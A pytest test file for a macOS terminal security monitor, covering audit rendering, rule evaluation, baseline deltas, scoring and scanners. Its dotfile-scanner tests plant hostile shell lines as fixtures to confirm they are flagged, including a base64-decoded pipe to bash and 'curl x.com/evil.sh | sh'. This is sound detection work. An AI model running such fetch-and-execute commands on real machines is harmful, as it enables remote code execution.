        captured = {}
        def fake_render(start_y, w, lines, *_a, **_k):
            captured["lines"] = list(lines)
        with patch("curses.color_pair", side_effect=lambda n: n << 8), \
             patch.object(monitor, "_render_detail",
                          side_effect=fake_render), \
             patch.object(monitor, "_put"):
            monitor.render()
        assert any("Running" in l for l in captured.get("lines", []))

    def test_rescanning_suffix_when_loading_with_lines(self, monitor):
        self._setup(monitor)
        monitor._audit_mode = True
        monitor._audit_type = "network"
        monitor._audit_loading = True
        monitor._audit_lines = ["  ━━ NETWORK ━━", "    [HIGH]  msg"]
        monitor._audit_findings_structured = [
            {"severity": "HIGH", "message": "msg", "action": None}]
        monitor._audit_line_for_finding = [1]
        monitor._audit_cursor = 0
        captured = {}
        def fake_render(start_y, w, lines, title=None, *_a, **_k):
            captured["title"] = title
        with patch("curses.color_pair", side_effect=lambda n: n << 8), \
             patch.object(monitor, "_render_detail",
                          side_effect=fake_render), \
             patch.object(monitor, "_put"):
            monitor.render()
        assert "rescanning" in (captured.get("title") or "").lower()

    def test_detail_pane_appended_for_cursored_finding(self, monitor):
        self._setup(monitor)
        monitor._audit_mode = True
        monitor._audit_type = "network"
        monitor._audit_loading = False
        monitor._audit_lines = [
            "  ━━ NETWORK ━━",
            "    [HIGH]  needle",
        ]
        monitor._audit_findings_structured = [{
            "severity": "HIGH", "message": "needle",
            "evidence": "EVIDENCE-TOKEN",
            "action": {"type": "enable_alf"},
        }]
        monitor._audit_line_for_finding = [1]
        monitor._audit_cursor = 0
        captured = {}
        def fake_render(start_y, w, lines, *_a, **_k):
            captured["lines"] = list(lines)
        with patch("curses.color_pair", side_effect=lambda n: n << 8), \
             patch.object(monitor, "_render_detail",
                          side_effect=fake_render), \
             patch.object(monitor, "_put"):
            monitor.render()
        joined = "\n".join(captured.get("lines", []))
        assert "DETAIL" in joined
        assert "EVIDENCE-TOKEN" in joined

    def test_cursor_overlay_on_audit_selected_row(self, monitor):
        self._setup(monitor)
        monitor._audit_mode = True
        monitor._audit_type = "network"
        monitor._audit_loading = False
        monitor._audit_lines = [
            "  ━━ NETWORK ━━",
            "    [x] [HIGH]  A",
            "    [x] [HIGH]  B",
        ]
        monitor._audit_findings_structured = [
            {"severity": "HIGH", "message": "A",
             "action": {"type": "enable_alf"}},
            {"severity": "HIGH", "message": "B",
             "action": {"type": "enable_alf"}},
        ]
        monitor._audit_line_for_finding = [1, 2]
        monitor._audit_cursor = 1
        captured = {}
        def fake_render(start_y, w, lines, *_a, **_k):
            captured["lines"] = list(lines)
        with patch("curses.color_pair", side_effect=lambda n: n << 8), \
             patch.object(monitor, "_render_detail",
                          side_effect=fake_render), \
             patch.object(monitor, "_put"):
            monitor.render()
        # Row B has the cursor arrow; row A does not
        lines = captured.get("lines", [])
        b_line = next(l for l in lines
                      if l.rstrip().endswith("B") and "DETAIL" not in l)
        a_line = next(l for l in lines
                      if l.rstrip().endswith("A") and "DETAIL" not in l)
        assert b_line.startswith("  \u25b6 ")
        assert not a_line.startswith("  \u25b6 ")


class TestTagColoring:
    def test_severity_tags_colored(self, monitor):
        # Exercise the severity branch of _tag_color
        for tag in ("[CRITICAL]", "[HIGH]", "[MEDIUM]", "[INFO]", "[OK]"):
            with patch("curses.color_pair",
                       side_effect=lambda n: n << 8):
                attr = monitor._tag_color(tag)
            assert attr is not None

    def test_count_suffixed_severity(self, monitor):
        with patch("curses.color_pair", side_effect=lambda n: n << 8):
            crit = monitor._tag_color("[CRITICAL 5]")
            high = monitor._tag_color("[HIGH 3]")
        assert crit is not None
        assert high is not None

    def test_actionable_marker_tagged(self, monitor):
        with patch("curses.color_pair", side_effect=lambda n: n << 8):
            attr = monitor._tag_color("[x]")
        assert attr is not None


class TestFormatStructuredReport:
    def test_subtitle_rendered(self, monitor):
        line_map = []
        lines = monitor._format_structured_report(
            "T", [{"severity": "INFO", "message": "m", "action": None}],
            line_map, subtitle="hint one\nhint two")
        assert any("hint one" in l for l in lines)
        assert any("hint two" in l for l in lines)

    def test_empty_findings_uses_empty_message(self, monitor):
        line_map = []
        lines = monitor._format_structured_report(
            "T", [], line_map, empty_message="NOTHING HERE")
        assert any("NOTHING HERE" in l for l in lines)

    def test_accepts_tuple_findings_legacy(self, monitor):
        # Old `(severity, msg)` tuple form should still be accepted.
        line_map = []
        lines = monitor._format_structured_report(
            "T", [("HIGH", "legacy")], line_map)
        assert any("legacy" in l for l in lines)

    def test_severity_groups_have_visual_gap(self, monitor):
        line_map = []
        lines = monitor._format_structured_report(
            "T", [
                {"severity": "HIGH", "message": "h", "action": None},
                {"severity": "INFO", "message": "i", "action": None},
            ], line_map)
        # Find the HIGH row; the next line should be blank (gap before INFO)
        h_idx = next(i for i, l in enumerate(lines) if "h" in l and "[HIGH]" in l)
        i_idx = next(i for i, l in enumerate(lines) if "i" in l and "[INFO]" in l)
        # At least one blank line in between
        between = lines[h_idx + 1 : i_idx]
        assert any(l.strip() == "" for l in between)


class TestFormatFindingDetailWrap:
    def test_long_evidence_wrapped(self, monitor):
        long = "X" * 300
        finding = {"severity": "HIGH", "message": "m", "evidence": long,
                   "action": None}
        lines = monitor._format_finding_detail(finding, width=40)
        # The 300-char blob should span multiple wrapped lines
        x_lines = [l for l in lines if l.strip().startswith("X")]
        assert len(x_lines) >= 2

    def test_empty_evidence_no_panel_divider(self, monitor):
        lines = monitor._format_finding_detail(
            {"severity": "INFO", "message": "m", "action": None}, 80)
        assert any("DETAIL" in l for l in lines)
        assert any("[INFO]" in l for l in lines)


# ── 5. Rule engine variants ────────────────────────────────────────────────


class TestRuleEngineKinds:
    def test_sysctl_value_match_fires(self, monitor):
        with patch.object(procmon, "_run_cmd_short",
                          return_value=(0, "0\n", "")):
            result = procmon._evaluate_rule({
                "id": "S-1", "kind": "sysctl_value",
                "severity": "HIGH", "message": "securelevel unlocked",
                "params": {"name": "kern.securelevel", "equals": "0"},
            })
        assert result is not None
        assert result["severity"] == "HIGH"

    def test_sysctl_value_mismatch_silent(self, monitor):
        with patch.object(procmon, "_run_cmd_short",
                          return_value=(0, "1\n", "")):
            result = procmon._evaluate_rule({
                "id": "S-2", "kind": "sysctl_value",
                "severity": "HIGH", "message": "x",
                "params": {"name": "kern.securelevel", "equals": "0"},
            })
        assert result is None

    def test_sysctl_value_sysctl_missing(self, monitor):
        with patch.object(procmon, "_run_cmd_short",
                          return_value=(1, "", "")):
            result = procmon._evaluate_rule({
                "id": "S-3", "kind": "sysctl_value",
                "severity": "HIGH", "message": "x",
                "params": {"name": "kern.securelevel", "equals": "0"},
            })
        assert result is None

    def test_launch_item_signer_matches_denied_team(self, monitor,
                                                   monkeypatch):
        monkeypatch.setattr(
            procmon, "_enumerate_launch_items",
            lambda: [{"path": "/x.plist", "label": "com.x",
                      "program": "/tmp/x", "domain": "system"}])
        monkeypatch.setattr(
            procmon, "_codesign_structured",
            lambda _p: {"team_id": "BADTEAM", "rc": 0,
                        "authority": [], "entitlements_xml": ""})
        with patch("os.path.exists", return_value=True):
            result = procmon._evaluate_rule({
                "id": "L-1", "kind": "launch_item_signer",
                "severity": "HIGH", "message": "banned",
                "params": {"deny_team_ids": ["BADTEAM"]},
            })
        assert result is not None

    def test_launch_item_signer_empty_deny_list(self, monitor):
        # Empty deny list is a no-op — no findings.
        result = procmon._evaluate_rule({
            "id": "L-2", "kind": "launch_item_signer",
            "severity": "HIGH", "message": "x",
            "params": {"deny_team_ids": []},
        })
        assert result is None

    def test_unknown_rule_kind_is_silent(self, monitor):
        assert procmon._evaluate_rule({"id": "?", "kind": "alien",
                                        "params": {}}) is None

    def test_load_custom_rules_reads_jsonl_files(self, tmp_path, monkeypatch):
        rules_dir = tmp_path / ".mac-tui-procmon-rules.d"
        rules_dir.mkdir()
        (rules_dir / "one.json").write_text(json.dumps({
            "id": "C-1", "kind": "path_exists", "severity": "LOW",
            "message": "x", "params": {"path": "/tmp"}}))
        (rules_dir / "two.json").write_text(json.dumps([
            {"id": "C-2a", "kind": "path_exists", "severity": "LOW",
             "message": "x", "params": {"path": "/tmp"}},
            {"id": "C-2b", "kind": "path_exists", "severity": "LOW",
             "message": "x", "params": {"path": "/tmp"}},
        ]))
        (rules_dir / "bad.json").write_text("not-json")
        monkeypatch.setattr(procmon, "_EFFECTIVE_HOME", str(tmp_path))
        rules = procmon._load_custom_rules()
        assert len(rules) == 3  # bad.json skipped silently

    def test_load_custom_rules_missing_dir(self, tmp_path, monkeypatch):
        monkeypatch.setattr(procmon, "_EFFECTIVE_HOME", str(tmp_path))
        # no .mac-tui-procmon-rules.d dir
        assert procmon._load_custom_rules() == []

    def test_audit_rule_engine_runs_defaults(self, monkeypatch):
        # All rules should be evaluated; some may fire on the real host,
        # but we just verify it doesn't crash and returns >= 1 item.
        monkeypatch.setattr(procmon, "_load_custom_rules", lambda: [])
        findings = procmon._audit_rule_engine()
        assert findings  # has at least one (rule hit or the OK fallback)


# ── 6. Baseline + sensitive-paths delta edge cases ─────────────────────────


class TestBaselineDeltaEdges:
    def test_removed_launch_item_surfaces_info(self, tmp_path, monkeypatch):
        path = tmp_path / "b.json"
        baseline = {
            "version": 1, "captured_at": int(time.time()),
            "launch_items": [{"path": "/gone.plist", "label": "g",
                              "program": "/g", "hash": ""}],
            "system_extensions": [], "listening_ports": [],
            "config_profiles": [], "sharing": {}}
        path.write_text(json.dumps(baseline))
        monkeypatch.setattr(procmon, "_BASELINE_PATH", str(path))
        monkeypatch.setattr(procmon, "_collect_baseline_snapshot",
                             lambda: {"launch_items": [],
                                      "system_extensions": [],
                                      "listening_ports": [],
                                      "config_profiles": [],
                                      "sharing": {}})
        findings = procmon._audit_baseline_delta()
        assert any("removed" in f["message"] for f in findings)

    def test_new_config_profile_flagged_high(self, tmp_path, monkeypatch):
        path = tmp_path / "b.json"
        path.write_text(json.dumps({
            "version": 1, "captured_at": int(time.time()),
            "launch_items": [], "system_extensions": [],
            "listening_ports": [], "config_profiles": [], "sharing": {}}))
        monkeypatch.setattr(procmon, "_BASELINE_PATH", str(path))
        monkeypatch.setattr(procmon, "_collect_baseline_snapshot",
                             lambda: {"launch_items": [],
                                      "system_extensions": [],
                                      "listening_ports": [],
                                      "config_profiles": [
                                          {"identifier": "com.new",
                                           "display_name": "New"}],
                                      "sharing": {}})
        findings = procmon._audit_baseline_delta()
        assert any(f["severity"] == "HIGH"
                   and "profile" in f["message"].lower()
                   for f in findings)

    def test_new_system_extension_flagged(self, tmp_path, monkeypatch):
        path = tmp_path / "b.json"
        path.write_text(json.dumps({
            "version": 1, "captured_at": int(time.time()),
            "launch_items": [], "system_extensions": [],
            "listening_ports": [], "config_profiles": [], "sharing": {}}))
        monkeypatch.setattr(procmon, "_BASELINE_PATH", str(path))
        monkeypatch.setattr(procmon, "_collect_baseline_snapshot",
                             lambda: {"launch_items": [],
                                      "system_extensions": [
                                          {"team_id": "NEW",
                                           "bundle_id": "com.new"}],
                                      "listening_ports": [],
                                      "config_profiles": [], "sharing": {}})
        findings = procmon._audit_baseline_delta()
        assert any("system extension" in f["message"] for f in findings)


# ── 7. Scoring edge cases ─────────────────────────────────────────────────


class TestScoringEdges:
    def test_all_findings_info_score_100(self):
        results = {k: [{"severity": "INFO", "message": "m", "action": None}]
                   for k in ("network", "system_hardening", "kernel_boot",
                             "tcc", "dns")}
        s = procmon._score_findings(results)
        # INFO has penalty 0 → score stays at 100
        assert s["global"] == 100

    def test_only_actionable_critical_in_fix_first(self):
        results = {
            "network": [
                {"severity": "CRITICAL", "message": "no action", "action": None},
                {"severity": "CRITICAL", "message": "actionable",
                 "action": {"type": "enable_alf"}},
                {"severity": "HIGH", "message": "act-hi",
                 "action": {"type": "enable_alf"}},
                {"severity": "MEDIUM", "message": "medium",
                 "action": {"type": "x"}},
            ],
        }
        s = procmon._score_findings(results)
        # Medium-with-action and Critical-without-action shouldn't appear;
        # only CRITICAL+action and HIGH+action do.
        names = [f["message"] for _, f in s["fix_first"]]
        assert "actionable" in names
        assert "act-hi" in names
        assert "no action" not in names
        assert "medium" not in names

    def test_bands_cover_all_ranges(self):
        assert procmon._severity_band(100) == "GREEN"
        assert procmon._severity_band(85) == "GREEN"
        assert procmon._severity_band(84) == "YELLOW"
        assert procmon._severity_band(60) == "YELLOW"
        assert procmon._severity_band(59) == "ORANGE"
        assert procmon._severity_band(40) == "ORANGE"
        assert procmon._severity_band(39) == "RED"
        assert procmon._severity_band(0) == "RED"


# ── 8. Menu rendering (_run_sectioned_menu) ────────────────────────────────


class TestSectionedMenu:
    def _drive(self, monitor, rows, keys, footer="f"):
        import curses
        monitor.stdscr.getmaxyx.return_value = (40, 120)
        monitor.stdscr.getch.side_effect = list(keys)
        picked = []
        with patch("curses.color_pair", side_effect=lambda n: n << 8), \
             patch.object(monitor, "_put"):
            monitor._run_sectioned_menu(
                rows, title="T", footer=footer,
                on_select=picked.append)
        return picked

    def test_enter_selects_first_action(self, monitor):
        import curses
        rows = [
            ("Head", "header", None),
            ("First", "action", "a"),
            ("Second", "action", "b"),
        ]
        out = self._drive(monitor, rows, [10])  # Enter
        assert out == ["a"]

    def test_down_skips_header(self, monitor):
        import curses
        rows = [
            ("H1", "header", None),
            ("A", "action", "a"),
            ("H2", "header", None),
            ("B", "action", "b"),
        ]
        out = self._drive(monitor, rows, [curses.KEY_DOWN, 10])
        assert out == ["b"]

    def test_esc_cancels(self, monitor):
        rows = [("H", "header", None), ("A", "action", "a")]
        out = self._drive(monitor, rows, [27])
        assert out == []

    def test_wraps_on_up_from_first_action(self, monitor):
        import curses
        rows = [("H", "header", None),
                ("A", "action", "a"),
                ("B", "action", "b")]
        out = self._drive(monitor, rows, [curses.KEY_UP, 10])
        assert out == ["b"]

    def test_pagedn_pageup_snap_to_action(self, monitor):
        import curses
        rows = [("H1", "header", None),
                ("A", "action", "a"),
                ("H2", "header", None),
                ("B", "action", "b")]
        # PageDn should land on an action
        out = self._drive(monitor, rows, [curses.KEY_NPAGE, 10])
        assert len(out) == 1

    def test_no_selectable_rows_returns_immediately(self, monitor):
        rows = [("H1", "header", None), ("H2", "header", None)]
        out = self._drive(monitor, rows, [])
        assert out == []


# ── 9. Misc small helpers ──────────────────────────────────────────────────


class TestReadPlistDefaults:
    def test_returns_empty_on_failure(self):
        with patch.object(procmon, "_run_cmd_short",
                          return_value=(1, "", "")):
            assert procmon._read_plist_defaults("nope") == {}

    def test_parses_exported_plist(self, monkeypatch):
        import plistlib
        blob = plistlib.dumps({"key": True, "n": 42}).decode("utf-8")
        with patch.object(procmon, "_run_cmd_short",
                          return_value=(0, blob, "")):
            d = procmon._read_plist_defaults("com.any")
        assert d["key"] is True
        assert d["n"] == 42


class TestResolveExtensionEdgeCases:
    def test_non_string_name(self, tmp_path):
        name = procmon._resolve_extension_name(
            None, str(tmp_path), "en", "idx")
        assert name == "idx"

    def test_numeric_name(self, tmp_path):
        name = procmon._resolve_extension_name(
            42, str(tmp_path), "en", "idx")
        assert name == "idx"


class TestCollectBaselineSnapshotHashes:
    def test_hash_in_launch_items(self, tmp_path, monkeypatch):
        plist = tmp_path / "com.x.plist"
        plist.write_text("real-contents")
        monkeypatch.setattr(
            procmon, "_enumerate_launch_items",
            lambda: [{"path": str(plist), "label": "x",
                      "program": "/x", "hash": ""}])
        monkeypatch.setattr(procmon, "_list_system_extensions",
                             lambda: [])
        monkeypatch.setattr(procmon, "_list_listening_sockets",
                             lambda: [])
        monkeypatch.setattr(procmon, "_list_config_profiles",
                             lambda: [])
        monkeypatch.setattr(procmon, "_sharing_services_state",
                             lambda: {})
        snap = procmon._collect_baseline_snapshot()
        # A non-empty sha256 should be populated
        assert len(snap["launch_items"][0]["hash"]) == 64


# ── 10. Shell dotfile scanner branches ─────────────────────────────────────


class TestShellDotfileScannerBranches:
    def test_base64_decoded_pipe_flagged(self, tmp_path, monkeypatch):
        zshrc = tmp_path / ".zshrc"
        zshrc.write_text("echo xxxx | base64 -d | bash\n")
        monkeypatch.setattr(procmon, "_DOTFILE_PATHS", [str(zshrc)])
        monkeypatch.setattr(procmon, "_DOTFILE_PATH_DIRS", [])
        findings = procmon._audit_shell_dotfiles()
        assert any(f["severity"] == "HIGH"
                   and "base64" in f["message"].lower()
                   for f in findings)

    def test_openssl_decoded_exec_flagged(self, tmp_path, monkeypatch):
        zshrc = tmp_path / ".zshrc"
        zshrc.write_text("openssl enc -aes -d -in beacon.bin\n")
        monkeypatch.setattr(procmon, "_DOTFILE_PATHS", [str(zshrc)])
        monkeypatch.setattr(procmon, "_DOTFILE_PATH_DIRS", [])
        findings = procmon._audit_shell_dotfiles()
        assert any(f["severity"] == "HIGH"
                   and "openssl" in f["message"].lower()
                   for f in findings)

    def test_periodic_dir_files_included(self, tmp_path, monkeypatch):
        periodic = tmp_path / "periodic"
        periodic.mkdir()
        (periodic / "evil").write_text("curl x.com/evil.sh | sh\n")
        monkeypatch.setattr(procmon, "_DOTFILE_PATHS", [])
        monkeypatch.setattr(procmon, "_DOTFILE_PATH_DIRS", [str(periodic)])
        findings = procmon._audit_shell_dotfiles()
        assert any("evil" in f["message"] for f in findings)


class TestAuditDnsProxyExtra:
    def test_pac_url_flagged(self, monkeypatch):
        proxy_text = (
            "  ProxyAutoConfigEnable : 1\n"
            "  ProxyAutoConfigURLString : http://bad.example/proxy.pac\n"
        )
        def fake(argv, **_):
            cmd = argv[0] if argv else ""
            if cmd == "scutil" and "--proxy" in argv:
                return (0, proxy_text, "")
            return (0, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake), \
             patch.object(procmon, "_read_hosts_file",
                          return_value=([], b"")), \
             patch.object(procmon, "_list_resolver_dir",
                          return_value=[]):
            findings = procmon._audit_dns_proxy_mdm()
        assert any("PAC" in f["message"] for f in findings)

    def test_etc_resolver_override_flagged(self, monkeypatch):
        def fake(argv, **_):
            return (0, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake), \
             patch.object(procmon, "_read_hosts_file",
                          return_value=([], b"")), \
             patch.object(procmon, "_list_resolver_dir",
                          return_value=[("corp.example", "nameserver 10.0.0.5\n")]):
            findings = procmon._audit_dns_proxy_mdm()
        assert any("corp.example" in f["message"] for f in findings)


class TestParseProfilesOutput:
    def test_config_profile_payload_extraction(self):
        out = (
            "_computerlevel[1] attribute: profileIdentifier: com.x.vpn\n"
            "_computerlevel[1] attribute: profileDisplayName: X VPN\n"
            "    PayloadType = \"com.apple.vpn.managed\"\n"
        )
        with patch.object(procmon, "_run_cmd_short",
                          return_value=(0, out, "")):
            profiles = procmon._list_config_profiles()
        assert len(profiles) == 1
        assert profiles[0]["identifier"] == "com.x.vpn"
        assert "com.apple.vpn.managed" in profiles[0]["payload_types"]
